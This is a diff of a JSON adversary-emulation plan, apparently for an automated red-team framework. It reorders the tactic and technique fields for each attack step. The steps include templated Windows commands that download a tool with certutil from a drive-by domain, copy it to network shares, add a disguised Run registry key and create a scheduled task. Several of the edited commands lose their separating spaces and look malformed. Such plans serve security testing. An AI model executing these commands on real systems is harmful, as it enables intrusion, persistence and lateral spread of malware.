@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,24 +49,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "self.tool_name2",
@@ -75,16 +75,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "SpearPhishingAttachment",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "SpearPhishingAttachment",
             "label": "spearPhishingAttachment",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -96,8 +96,8 @@
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -107,8 +107,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -118,8 +118,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -132,8 +132,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -142,8 +142,8 @@
             }
         },
         {
-            "tactic": "SystemOwnerUserDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -155,21 +155,21 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2} ${self.temp_dir_name_1}\\${self.tool_name2} && echo \" \""
+                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name_1}\\${self.tool_name2}&& echo \" \""
                 }
             }
         },
         {
-            "tactic": "TaintSharedContent",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "TaintSharedContent",
             "label": "taintSharedContent",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -177,26 +177,26 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_1",
                 "tune": {
-                    "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; robocopy ${self.temp_dir_name_1} $fp ${self.tool_name2}}"
+                    "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; robocopy${self.temp_dir_name_1}$fp${self.tool_name2}}"
                 }
             }
         },
         {
-            "tactic": "RegistryRunKeysStartupFolder",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "RegistryRunKeysStartupFolder",
             "label": "addRunRegistryKey",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftOfficeUpdater /d C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2} /f}"
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftOfficeUpdater /d C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}/f}"
                 }
             }
         },
         {
-            "tactic": "NativeApi",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "NativeApi",
             "label": "nativeApi",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -205,8 +205,8 @@
             }
         },
         {
-            "tactic": "FileAndDirectoryDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "FileAndDirectoryDiscovery",
             "label": "fileAndDirectoryDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -218,21 +218,21 @@
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduledTaskExecution",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute = $time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC minute /TN \"deepmost\", /TR \"cmd /c ${self.temp_dir_name_1}\\${self.tool_name2} \" /ST $hourMinute /F}"
+                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute = $time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC minute /TN \"deepmost\", /TR \"cmd /c${self.temp_dir_name_1}\\${self.tool_name2}\" /ST $hourMinute /F}"
                 }
             }
         },
         {
-            "tactic": "ScreenCapture",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ScreenCapture",
             "label": "screenCapture",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -244,8 +244,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "processDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -257,8 +257,8 @@
             }
         },
         {
-            "tactic": "PeripheralDeviceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "PeripheralDeviceDiscovery",
             "label": "peripheralDeviceDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -270,8 +270,8 @@
             }
         },
         {
-            "tactic": "MatchLegitimateNameOrLocation",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "MatchLegitimateNameOrLocation",
             "label": "matchLegitimateNameOrLocation",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -283,8 +283,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverC2Channel",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverC2Channel",
             "label": "exfiltrationOverC2Channel",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -296,8 +296,8 @@
             }
         },
         {
-            "tactic": "FileDeletion",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletion",
             "label": "fileDeletionLocal",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -309,8 +309,8 @@
             }
         },
         {
-            "tactic": "FileDeletionPowershell",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletionPowershell",
             "label": "fileDeletionShare",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -322,8 +322,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
